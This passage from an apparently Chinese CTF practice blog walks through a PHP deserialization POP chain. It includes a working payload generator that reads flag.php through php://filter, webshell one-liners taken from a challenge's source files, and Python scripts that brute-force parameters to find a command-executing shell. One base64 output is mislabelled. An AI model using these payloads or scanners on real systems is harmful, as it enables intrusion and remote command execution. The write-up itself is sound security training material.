class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>想要获得 flag 需要用 Modifier 类中的 include 文件包含读取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>触发 <code>append()</code>  就需要用 <code>__invoke()</code>  触发，触发 <code>invoke()</code>  就需要把 Modifier 类被当作函数调用， <code>__invoke(当尝试以调用函数的方式调用一个对象时，方法会被自动调用)</code> ，现在得到可以知道 <code>__invoke()-&gt;append-&gt;文件包含</code> 的部分 pop 链</p>
<p>本题的参数是 pop，当 pop 参数为 Show 类的时候，反序列化时会先调用 <code>__wakeup()</code>  过滤，这时候 pop 包含两个参数，分别是 <code>source</code>  和 <code>str</code> ，因为该类中函数 <code>__construct()</code>  有 <code>echo $this-&gt;source</code> ，此时如果 source 数是 new 一个类的话（就是作为一个类的对象），就会调用 <code>__toString()</code>  函数，那就可以把 source 参数 <code>new Show()</code> ，这时候 <code>__toString()</code>  被调用，其中 <code>$this-&gt;str-&gt;source</code> ，就是 Show 类中 source 参数的 str 参数的 source 参数，如果将 str 参数 <code>new Test()</code> ，因为 Test 类中不具有 source 参数，执行 <code>__toString()</code>  函数则会找不到 source 参数，就会调用 <code>__get()</code>  函数，而 <code>__get()</code>  函数中 function 为调用的 p 参数，如果 $function 是个对象，那么则会调用__invoke () 函数，此时如果将 p 参数设置为 Modifier 类，就会执行文件包含输出内容为参数 var，所以在写 payload 的时候修改 var 参数，再进行序列化就可以读出 flag 了，但是直接包含是得不到 flag 的，需要利用 php 伪协议 filter 来读取 <code>flag.php</code> ，最后 base64 解码就可以得到 flag。所以最后的 pop 链为：</p>
<p><code>__construct-&gt;__toString()-&gt;__get()-&gt;__invoke()-&gt;append-&gt;文件包含</code></p>
<p>构造 payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload 中可以删去源码一些在编写脚本时多余的代码，让 payload 更简洁，但我就没有去删了，感觉这样效率更高。</p>
<p>需要 urlencode 的原因是因为如果不进行编码，最后输出的结果是片段的，不是全部的，会有类似截断导致结果异常，在一些不是 public 定义的变量，反序列化会有一些乱码，直接 urlencode 就不用担心这类情况。</p>
<p>由 payload 得到 url 编码的序列化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFne2M5NmRkNmFhLTA1ZjYtNGUxNi04ZmQyLTFjZTczOGYxNjlkNH0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+</span><br></pre></td></tr></table></figure>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c04.png" alt></p>
<p>得到的 base64 拿去解码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c05.png" alt></p>
<p c96dd6aa-05f6-4e16-8fd2-1ce738f169d4>拿到 flag，flag</p>
<h2 id="强网杯-2019高明的黑客"><a class="markdownIt-Anchor" href="#强网杯-2019高明的黑客">#</a> [强网杯 2019] 高明的黑客</h2>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c06.png" alt></p>
<p>下载 <code>www.tar.gz</code> ，得到 3002 个 php 文件。。。</p>
<p>在这写 php 文件中有很多 <code>??</code>  符号，例如： <code>system($_GET['jVMcNhK_F'] ?? ' ');</code> ，查了一下，这里记录一下</p>
<p>在 PHP 中， <code>??</code>  符号是空合并运算符（Null Coalescing Operator）。它用于简化检查变量是否已设置并且不为 null 的过程。</p>
<p>通常，我们可能会使用三元运算符来检查一个变量是否已设置，并且不为 null，然后提供一个备用值，例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="keyword">isset</span>(<span class="variable">$variable</span>) ? <span class="variable">$variable</span> : <span class="variable">$defaultValue</span>;</span><br></pre></td></tr></table></figure>
<p>使用空合并运算符，可以更简洁地完成相同的操作：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="variable">$variable</span> ?? <span class="variable">$defaultValue</span>;</span><br></pre></td></tr></table></figure>
<p>这行代码的意思是，如果  <code>$variable</code>  已经设置并且不为 null，那么  <code>$result</code>  将被赋值为  <code>$variable</code>  的值。如果  <code>$variable</code>  是未设置或者为 null，那么  <code>$result</code>  将被赋值为  <code>$defaultValue</code> 。</p>
<p>在这些代码中，有很多类似一下的代码片段：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;jVMcNhK_F&#x27;</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;jVMcNhK_F&#x27;</span>] ?? <span class="string">&#x27; &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;tz2aE_IWb&#x27;</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> `&#123;<span class="variable">$_GET</span>[<span class="string">&#x27;tz2aE_IWb&#x27;</span>]&#125;`;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;cXjHClMPs&#x27;</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> `&#123;<span class="variable">$_GET</span>[<span class="string">&#x27;cXjHClMPs&#x27;</span>]&#125;`;</span><br></pre></td></tr></table></figure>
<p>其中 system 和 echo 以及 eval 这三个函数都可以返回值，exec 函数是不回显的，到这一步就还是不知道该怎么做，查看别的师傅的 wp 的时候看到一句话<strong>每个 php 文件都有若干个一句话木马</strong>，才突然觉得，确实这些代码很想平时写的一句话木马。写脚本测试哪一个 shell 可以连接的吗？</p>
<p>对于利用 python 写脚本还是比较陌生，用别的师傅的 wp 来学习，这里贴一下学习链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/115256974">https://blog.csdn.net/RABCDXB/article/details/115256974</a></p>
<p><strong>简单的 exp（这不是题解，只是学习用的）：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = os.listdir(<span class="string">&#x27;D:/phpstudy/www/test/&#x27;</span>)    <span class="comment">#获取路径下的所有文件</span></span><br><span class="line">reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(?&lt;=_GET\[\&#x27;).*(?=\&#x27;\])&#x27;</span>)    <span class="comment">#设置正则表达式，正则表达式的解释看原文</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:     <span class="comment">#从第一个文件开始</span></span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1/test/&quot;</span> + i</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;D:/phpstudy/www/test/&quot;</span> + i)   <span class="comment">#打开该文件</span></span><br><span class="line">    data = f.read()     <span class="comment">#读取</span></span><br><span class="line">    f.close()       <span class="comment">#关闭</span></span><br><span class="line">    result = reg.findall(data)  <span class="comment">#从文件中查找GET请求</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> result:        <span class="comment">#从第一个GET请求开始</span></span><br><span class="line">        payload = url + <span class="string">&quot;?&quot;</span> + j + <span class="string">&quot;=echo ******&quot;</span>    <span class="comment">#尝试请求多次路径，并执行命令</span></span><br><span class="line">        <span class="built_in">print</span>(payload)    <span class="comment">#返回每次payload</span></span><br><span class="line">        html = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span>  <span class="string">&quot;******&quot;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            <span class="built_in">print</span>(payload + <span class="string">&#x27; success&#x27;</span>)     <span class="comment">#返回成功的payload+success</span></span><br><span class="line">            exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>正则表达式 <code>r'(?&lt;=_GET\[\').*(?=\'\])'</code>  解释</p>
<p>这个正则表达式用于匹配形如  <code>_GET['some_key']</code>  的字符串，并提取  <code>some_key</code>  部分。让我解释一下每个部分：</p>
<ul>
<li><code>(?&lt;=_GET\[')</code> : 这是一个正则表达式的<strong>前瞻断言</strong>（lookbehind assertion），表示匹配的内容之前必须是  <code>_GET['</code> ，其中  <code>\['</code>  是转义字符，匹配字符  <code>[</code> 。</li>
<li><code>.*</code> : 这表示匹配任意数量的字符（包括 0 个字符），直到下一个部分匹配为止。</li>
<li><code>(?=\'\])</code> : 这是一个正则表达式的<strong>后瞻断言</strong>（lookahead assertion），表示匹配的内容之后必须是  <code>']</code> ，其中  <code>\'</code>  是转义字符，匹配字符  <code>'</code> 。</li>
</ul>
<p>综合起来，整个正则表达式的作用是匹配  <code>_GET['some_key']</code>  格式的字符串，并提取  <code>some_key</code>  部分。</p>
<p><strong>高配版 exp，贴个原文（<a target="_blank" rel="noopener" href="https://blog.csdn.net/a3320315/article/details/102945940%EF%BC%89%EF%BC%9A">https://blog.csdn.net/a3320315/article/details/102945940）：</a></strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始时间：   &#x27;</span> + time.asctime(time.localtime(time.time())))  <span class="comment">#一个简单的时间函数，为了美观</span></span><br><span class="line">s1 = threading.Semaphore(<span class="number">100</span>)   <span class="comment">#设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;D:/phpstudy/WWW/hack/src/&quot;</span></span><br><span class="line">os.chdir(filePath)      <span class="comment">#改变当前工作目录到指定的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>   <span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)    <span class="comment">#得到该目录下所有文件名</span></span><br><span class="line">session = requests.Session()    <span class="comment">#先实例化一个对象，得到session()为之后的实现代码回显得取创造条件</span></span><br><span class="line">session.keep_alive = <span class="literal">False</span>  <span class="comment">#如果开启keep-alive，则服务端在返回response后不关闭TCP连接，设置连接活跃状态为False，是为了减少无效的连接？</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">file</span>):</span><br><span class="line">    s1.acquire()    <span class="comment">#我的理解是锁住这些线程资源，具体看https://vimsky.com/examples/usage/python-lock-acquire-method-with-example-02.html</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;trying &#x27;</span> + file + <span class="string">&#x27; &#x27;</span> + time.asctime(time.localtime(time.time())))   <span class="comment">#美观，同时可以对比不加线程和加线程的时间对比</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f: <span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">        gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">        posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/hack/src/&#x27;</span> + file</span><br><span class="line">    req = session.post(url, data=data, params=params)    <span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()     <span class="comment">#关闭请求，释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:     <span class="comment">#查找是否又可利用的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()     <span class="comment">#关闭请求，释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:        <span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;，利用的参数：%s&quot;</span> %param)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()    <span class="comment">#对应于之前的多线程打开，此方法释放线程先前获取的锁</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:     <span class="comment">#加入多线程</span></span><br><span class="line">    t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>
<p><strong>记录解释 <code>'\$_POST\[\'(.*?)\'\]'</code> ：</strong></p>
<p>这个正则表达式用于匹配 PHP 中  <code>$_POST</code>  超全局数组中的键。下面是对正则表达式的解释：</p>
<ul>
<li><code>\$_POST</code> : 匹配  <code>$_POST</code>  字面字符串。由于  <code>$</code>  和  <code>.</code>  在正则表达式中具有特殊含义，所以需要使用  <code>\</code>  来转义它们，以确保匹配字面意义上的字符  <code>$</code>  和  <code>POST</code> 。</li>
<li><code>\[</code> : 匹配左方括号  <code>[</code> 。由于  <code>[</code>  也是正则表达式中的元字符，因此需要使用  <code>\</code>  转义。</li>
<li><code>\'</code> : 匹配单引号  <code>'</code>  字符。同样，由于单引号也是正则表达式中的特殊字符，因此需要使用  <code>\</code>  转义。</li>
<li><code>(.*?)</code> : 这是一个捕获组，用于捕获任意数量的任意字符，但是以非贪婪方式匹配，即尽可能少地匹配字符。 <code>.*?</code>  表示匹配任意字符零次或多次， <code>?</code>  表示非贪婪模式，即尽可能短地匹配。</li>
<li><code>\'</code> : 匹配单引号  <code>'</code>  字符。同样，由于单引号也是正则表达式中的特殊字符，因此需要使用  <code>\</code>  转义。</li>
<li><code>\]</code> : 匹配右方括号  <code>]</code> 。同样，由于  <code>]</code>  也是正则表达式中的元字符，因此需要使用  <code>\</code>  转义。</li>
</ul>
<p>综合起来，这个正则表达式用于匹配形如  <code>$_POST['键名']</code>  的字符串。</p>
<p><strong>记录解释 <code>threading.Thread(target=get_content, args=(i,))</code> ：</strong></p>
